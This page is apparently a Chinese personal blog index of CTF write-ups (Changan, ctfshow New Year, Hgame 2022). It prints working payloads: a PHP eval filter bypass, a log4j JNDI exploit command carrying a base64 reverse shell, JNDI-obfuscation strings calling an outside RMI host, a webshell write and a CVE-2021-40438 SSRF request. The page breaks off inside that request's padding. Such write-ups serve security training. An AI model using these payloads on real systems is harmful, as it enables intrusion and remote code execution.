<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><title>cyxin</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '6.0.0'
} </script><meta name="generator" content="Hexo 6.0.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">John Doe</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">34</span></a></div></div></div><nav id="nav" style="background-image: url(https://cdn.eso.org/images/screen/eso0932a.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">cyxin</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="site-info"><div id="site-title">cyxin</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/18/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/">长安“战疫”网络安全卫士守护赛</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-18</time><div class="content"><h2 id="RCE-No-Par"><a href="#RCE-No-Par" class="headerlink" title="RCE_No_Par"></a>RCE_No_Par</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>一篇相识的博客<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7355a5ab4822">相似的博客</a><br>从中发现本题是博客中的那题的升级<br>由于/session|end|next|header|dir这些都被ban，则找替换<br>发现end可由pos(array_reverse())替换，则<br>paylaod</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="keyword">eval</span>(pos(array_reverse(current(get_defined_vars()))));&amp;b=phpinfo();</span><br></pre></td></tr></table></figure>

<h2 id="西安加油"><a href="#西安加油" class="headerlink" title="西安加油"></a>西安加油</h2><p>下载文档得到文件<br>利用whireshark打开<br>导出http对象，发现secret.txt文件<br>打开得到<br><img src="https://img-blog.csdnimg.cn/32758d5addaf44b98641cf534cb24e41.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>之后base64解密得到zip文件，解压得到<br><img src="https://img-blog.csdnimg.cn/d739be0e76ab40e5a11764f0a798c3ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>之后进行拼接得到<br><img src="https://img-blog.csdnimg.cn/dd49dac2866845fda38bb637e9d93d94.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="web-Shiro"><a href="#web-Shiro" class="headerlink" title="web Shiro?"></a>web Shiro?</h2><p>就是log4j，过滤了一下jndi<br>参考<a target="_blank" rel="noopener" href="https://le1a.gitee.io/posts/3e4e56bc/">log4j</a><br>我的是利用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar target/JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|bash&quot;</span> -A <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">注意:根据自身情况调整payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>由于没有服务器所以之后没做<br>详细操作参考（与上面不一样，下面较详细）<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43895765/article/details/121943404">log4j</a><br>值得注意的是jndi得过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">绕过jndi</span><br><span class="line"></span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi:<span class="comment">//101.34.46.94:1099/sv7c8c&#125;</span></span><br><span class="line"></span><br><span class="line">&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;:<span class="comment">//101.34.46.94:1099/sv7c8c&#125;</span></span><br></pre></td></tr></table></figure>
<p>上述两种看情况使用<br>最后反弹shell得到flag</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/18/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/">ctfshow新春欢乐赛</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-18</time><div class="content"><h2 id="热身"><a href="#热身" class="headerlink" title="热身"></a>热身</h2><p>开局看到源码，但是却没有显示源码的代码。那么只能是被包含进去了，直接phpinfo搜prepend可以看到包含的文件，查看之得到flag。<br><img src="https://img-blog.csdnimg.cn/893ec64d0beb4ba39a35cee10c025a1d.png" alt="在这里插入图片描述"><br>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=system(<span class="string">&quot;tac /etc/ssh/secret/youneverknow/secret.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[content];</span><br><span class="line">file_put_contents(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ctf-死亡exit绕过"><a href="#ctf-死亡exit绕过" class="headerlink" title="ctf 死亡exit绕过"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/njqfb/article/details/117574395">ctf 死亡exit绕过</a></h2><h2 id="title-ctfshow新春欢乐赛"><a href="#title-ctfshow新春欢乐赛" class="headerlink" title="title: ctfshow新春欢乐赛"></a>title: ctfshow新春欢乐赛</h2><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">session_start();</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(count(<span class="variable">$_POST</span>)===<span class="number">1</span>)&#123;</span><br><span class="line">        extract(<span class="variable">$_POST</span>);</span><br><span class="line">        <span class="keyword">if</span> (call_user_func($$$$$$&#123;key(<span class="variable">$_POST</span>)&#125;)===<span class="string">&quot;HappyNewYear&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>利用session修改变量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Body</span><br><span class="line">session_id=session_id</span><br><span class="line">Cookie</span><br><span class="line">PHPSESSID=HappyNewYear</span><br></pre></td></tr></table></figure>

<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-01-16 15:42:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-01-24 22:14:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$key</span>=  call_user_func((<span class="variable">$_GET</span>[<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key</span>==<span class="string">&quot;HappyNewYear&quot;</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;虎年大吉，新春快乐！&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>弱类型比较，布尔值和任意字符串弱相等</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=session_start</span><br><span class="line"><span class="number">1</span>=json_last_error</span><br></pre></td></tr></table></figure>

<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-01-16 15:42:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-01-24 22:14:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span>=  call_user_func((<span class="variable">$_GET</span>[<span class="number">1</span>]));</span><br><span class="line">file_put_contents(<span class="variable">$key</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;虎年大吉，新春快乐！&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>需要写入一句话木马，那么$key的值应该为php后缀文件<br>寻找调用返回php后缀的函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>= spl_autoload_extensions</span><br><span class="line"><span class="comment">//之后进入.inc,.php</span></span><br><span class="line"><span class="number">1</span>=system(<span class="string">&quot;cat /f*&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>预期解为发送超长字符致使php内存溢出，非预期是竞争。<br>发送大量的hu即可通过替换实现内存占用放大，超过php最大默认内存256M即可造成变量定义失败，出现致命错误从而跳过后面的覆盖写入。<br>一个 hu 替换128 kB<br>准确计算： 256 * 1024 *1024 / 128 / 1024 = 2097152 个，用python生成下即可<br>发送过多服务器会报错o(╥﹏╥)o<br>用burp传进去，然后访问 /🐯 下载文件即可得到flag</p>
<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>之后的不太会，看大佬博客<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Little_jcak/article/details/122819006">大佬博客</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/18/Hello%20Hgame%202022/">Hgame 2022</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-18</time><div class="content"><h2 id="web蛛蛛…嘿嘿♥我的蛛蛛"><a href="#web蛛蛛…嘿嘿♥我的蛛蛛" class="headerlink" title="web蛛蛛…嘿嘿♥我的蛛蛛"></a>web蛛蛛…嘿嘿♥我的蛛蛛</h2><p>本题进入题目后，根据题目到达第100关，对提示进行抓包，在回复中得到flag</p>
<h2 id="webTetris-plus"><a href="#webTetris-plus" class="headerlink" title="webTetris plus"></a>webTetris plus</h2><p>本题打开页面，是个游戏，可以F12，之后搜索alert<br><img src="https://img-blog.csdnimg.cn/1619019c2f56423c8da4ccae96940cc8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在check.js中的alert下面有jsfuck加密<br>在控制台上解密得到flag</p>
<h2 id="webeasy-auth"><a href="#webeasy-auth" class="headerlink" title="webeasy_auth"></a>webeasy_auth</h2><p>标题auth提示是鉴权方面的问题，描述中的“没有调试完”说明存在弱密码之类的问问题。问题出在前后后端交互的token中<br>首先正常注册并登录自己的账号，获得自己的token<br><img src="https://img-blog.csdnimg.cn/0fbc2d34a505494eb3801db04b9686f9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>前往jwt解析工具进行解析，，对taken进行jwt解密<br><img src="https://img-blog.csdnimg.cn/f5f5b153050543639143c42b7c54f407.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>之后将id和token进行修改，改为1和admin<br><img src="https://img-blog.csdnimg.cn/7d02c9a493cf4acf8cd2af66923a7ae4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>放入本地存储空间，修改后刷新得到flag<br><img src="https://img-blog.csdnimg.cn/5e33cf3d0f1943c0aa9632ee167c4de3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="misc好康的流量"><a href="#misc好康的流量" class="headerlink" title="misc好康的流量"></a>misc好康的流量</h2><p>附件为wireshark流量文件<br>大概能看出流量内容为一封邮件<br>使用wireshark的 导出SMB对象 即可导出邮件内容<br>PS：部分wireshark因为版本问题无法识别 使用追踪tcp流 然后base64解码 获得邮件内容<br>结合邮件中的LSB内容<br>判断是LSB隐写<br>扫描得到前半段flag<br><img src="https://img-blog.csdnimg.cn/6cb68965309f4155be7d4e2ff768c4e3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得后半段<br><img src="https://img-blog.csdnimg.cn/3818672e03194c17a9f7dcda31c2df0f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="webpack-engine"><a href="#webpack-engine" class="headerlink" title="webpack-engine"></a>webpack-engine</h2><p>看源码<br><img src="https://img-blog.csdnimg.cn/8f3aea5f37794c06a1bf19699556d41e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="web-Apache"><a href="#web-Apache" class="headerlink" title="web Apache!"></a>web Apache!</h2><p>打开题目看源码发现附件<br>在Default.conf发现flag路径<br><img src="https://img-blog.csdnimg.cn/5f26a67b06754c38ae817ebed19c5591.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>本题考查CVE-2021-40438 Apache mod_proxy SSRF 漏洞<br>看详细资料<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/263175#h2-0">CVE-2021-40438 Apache mod_proxy SSRF 漏洞分析</a><br><a target="_blank" rel="noopener" href="https://firzen.de/building-a-poc-for-cve-2021-40438">为 CVE-2021-40438 构建 POC</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/257657">Apache httpd Server CVE-2021-40438 漏洞分析</a><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html">Apache mod_proxy SSRF（CVE-2021-40438）的一点分析和延伸</a><br>从而得到路径</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /proxy?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA